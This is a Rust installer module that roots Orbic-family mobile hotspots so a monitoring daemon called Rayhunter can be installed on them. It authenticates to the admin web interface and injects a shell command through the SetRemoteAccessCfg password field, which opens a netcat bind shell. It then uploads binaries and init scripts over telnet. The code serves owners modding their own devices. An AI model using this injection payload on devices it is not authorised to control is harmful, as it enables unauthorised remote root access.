use std::net::SocketAddr;
use std::str::FromStr;
use std::time::Duration;

use anyhow::{Context, Result, bail};
use reqwest::Client;
use serde::Deserialize;
use tokio::time::sleep;

use crate::RAYHUNTER_DAEMON_INIT;
use crate::connection::{TelnetConnection, install_config};
use crate::orbic_auth::{LoginInfo, LoginRequest, LoginResponse, encode_password};
use crate::output::{eprintln, print, println};
use crate::util::{interactive_shell, telnet_send_command, telnet_send_file};

// Some kajeet devices have password protected telnetd on port 23, so we use port 24 just in case
const TELNET_PORT: u16 = 24;

#[derive(Deserialize, Debug)]
struct ExploitResponse {
    retcode: u32,
}

async fn login_and_exploit(admin_ip: &str, username: &str, password: &str) -> Result<()> {
    let client: Client = Client::new();

    // Step 1: Get login info (priKey and session cookie)
    let login_info_response = client
        .get(format!("http://{}/goform/GetLoginInfo", admin_ip))
        .send()
        .await
        .context("Failed to get login info")?;

    let session_cookie = login_info_response
        .headers()
        .get("set-cookie")
        .and_then(|cookie| cookie.to_str().ok())
        .context("No session cookie received")?
        .split(';')
        .next()
        .context("Invalid cookie format")?
        .to_string();

    let login_info: LoginInfo = login_info_response
        .json()
        .await
        .context("Failed to parse login info")?;

    if login_info.retcode != 0 {
        bail!("GetLoginInfo failed with retcode: {}", login_info.retcode);
    }

    // Parse priKey (format: "secret x timestamp")
    let mut parts = login_info.pri_key.split('x');
    let secret = parts.next().context("Missing secret in priKey")?;
    let timestamp = parts.next().context("Missing timestamp in priKey")?;
    if parts.next().is_some() {
        bail!("Invalid priKey format: {}", login_info.pri_key);
    }

    // Step 2: Encode credentials
    let username_md5 = format!("{:x}", md5::compute(username));
    let timestamp_start = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs();

    let encoded_password = encode_password(password, secret, timestamp, timestamp_start)
        .context("Failed to encode password")?;

    let login_request = LoginRequest {
        username: username_md5,
        password: encoded_password,
    };

    // Step 3: Perform login
    let login_response = client
        .post(format!("http://{}/goform/login", admin_ip))
        .header("Content-Type", "application/json")
        .header("Cookie", &session_cookie)
        .json(&login_request)
        .send()
        .await
        .context("Failed to send login request")?;

    // Extract authenticated session cookie from login response
    let authenticated_cookie = login_response
        .headers()
        .get("set-cookie")
        .and_then(|cookie| cookie.to_str().ok())
        .map(|cookie| cookie.split(';').next().unwrap_or(cookie).to_string())
        .unwrap_or(session_cookie);

    let login_result: LoginResponse = login_response
        .json()
        .await
        .context("Failed to parse login response")?;

    if login_result.retcode != 0 {
        bail!("Login failed with retcode: {}", login_result.retcode);
    }

    // Step 4: Exploit using authenticated session
    let response: ExploitResponse = client
        .post(format!("http://{}/action/SetRemoteAccessCfg", admin_ip))
        .header("Content-Type", "application/json")
        .header("Cookie", authenticated_cookie)
        // Original Orbic lacks telnetd (kajeet has it) so we need to use netcat
        .body(format!(
            r#"{{"password": "\"; busybox nc -ll -p {TELNET_PORT} -e /bin/sh & #"}}"#
        ))
        .send()
        .await
        .context("failed to start telnet")?
        .json()
        .await
        .context("failed to start telnet")?;

    if response.retcode != 0 {
        bail!("unexpected response while starting telnet: {:?}", response);
    }

    Ok(())
}

pub async fn start_telnet(
    admin_ip: &str,
    admin_username: &str,
    admin_password: Option<&str>,
) -> Result<()> {
    let Some(admin_password) = admin_password else {
        anyhow::bail!("--admin-password is required");
    };

    print!("Logging in and starting telnet... ");
    login_and_exploit(admin_ip, admin_username, admin_password).await?;
    println!("done");

    Ok(())
}

pub async fn install(
    admin_ip: String,
    admin_username: String,
    admin_password: Option<String>,
    reset_config: bool,
) -> Result<()> {
    let Some(admin_password) = admin_password else {
        eprintln!(
            "As of version 0.8.0, the orbic installer has been rewritten and now requires an --admin-password parameter."
        );
        eprintln!(
            "Refer to the official documentation at https://efforg.github.io/rayhunter/ for how to find the right value."
        );
        eprintln!();
        eprintln!(
            "If you are following a tutorial that does not include this parameter, the tutorial is likely outdated. You can run ./installer orbic-usb to access the old installer, however we recommend against it."
        );
        anyhow::bail!("exiting");
    };

    print!("Logging in and starting telnet... ");
    login_and_exploit(&admin_ip, &admin_username, &admin_password).await?;
    println!("done");

    print!("Waiting for telnet to become available... ");
    wait_for_telnet(&admin_ip).await?;
    println!("done");

    setup_rayhunter(&admin_ip, reset_config).await
}

async fn wait_for_telnet(admin_ip: &str) -> Result<()> {
    let addr = SocketAddr::from_str(&format!("{admin_ip}:{TELNET_PORT}"))?;
    let timeout = Duration::from_secs(60);
    let start_time = std::time::Instant::now();

    while telnet_send_command(addr, "true", "exit code 0", false)
        .await
        .is_err()
    {
        if start_time.elapsed() >= timeout {
            bail!(
                "Timeout waiting for telnet to become available after {:?}",
                timeout
            );
        }
        sleep(Duration::from_secs(1)).await;
    }

    Ok(())
}

async fn setup_rayhunter(admin_ip: &str, reset_config: bool) -> Result<()> {
    let addr = SocketAddr::from_str(&format!("{admin_ip}:{TELNET_PORT}"))?;
    let rayhunter_daemon_bin = include_bytes!(env!("FILE_RAYHUNTER_DAEMON"));

    // Remount filesystem as read-write to allow modifications
    // This is really only necessary for the Moxee Hotspot
    telnet_send_command(
        addr,
        "mount -o remount,rw /dev/ubi0_0 /",
        "exit code 0",
        false,
    )
    .await?;

    telnet_send_command(addr, "mkdir -p /data/rayhunter", "exit code 0", false).await?;

    telnet_send_file(
        addr,
        "/data/rayhunter/rayhunter-daemon",
        rayhunter_daemon_bin,
        false,
    )
    .await?;

    let mut conn = TelnetConnection::new(addr, false);
    install_config(
        &mut conn,
        "/data/rayhunter/config.toml",
        "orbic",
        reset_config,
    )
    .await?;

    telnet_send_file(
        addr,
        "/etc/init.d/rayhunter_daemon",
        RAYHUNTER_DAEMON_INIT.as_bytes(),
        false,
    )
    .await?;

    telnet_send_file(
        addr,
        "/etc/init.d/misc-daemon",
        include_bytes!("../../dist/scripts/misc-daemon"),
        false,
    )
    .await?;

    telnet_send_command(
        addr,
        "chmod +x /data/rayhunter/rayhunter-daemon",
        "exit code 0",
        false,
    )
    .await?;
    telnet_send_command(
        addr,
        "chmod 755 /etc/init.d/rayhunter_daemon",
        "exit code 0",
        false,
    )
    .await?;
    telnet_send_command(
        addr,
        "chmod 755 /etc/init.d/misc-daemon",
        "exit code 0",
        false,
    )
    .await?;

    println!("Installation complete. Rebooting device...");
    telnet_send_command(addr, "shutdown -r -t 1 now", "", false)
        .await
        .ok();

    println!(
        "Device is rebooting. After it's started up again, check out the web interface at http://{}:8080",
        admin_ip
    );

    Ok(())
}

/// Root the Orbic device and open an interactive shell
pub async fn shell(
    admin_ip: &str,
    admin_username: &str,
    admin_password: Option<&str>,
) -> Result<()> {
    start_telnet(admin_ip, admin_username, admin_password).await?;
    eprintln!(
        "This terminal is fairly limited. The shell prompt may not be visible, but it still accepts commands."
    );
    interactive_shell(admin_ip, TELNET_PORT, false).await
}
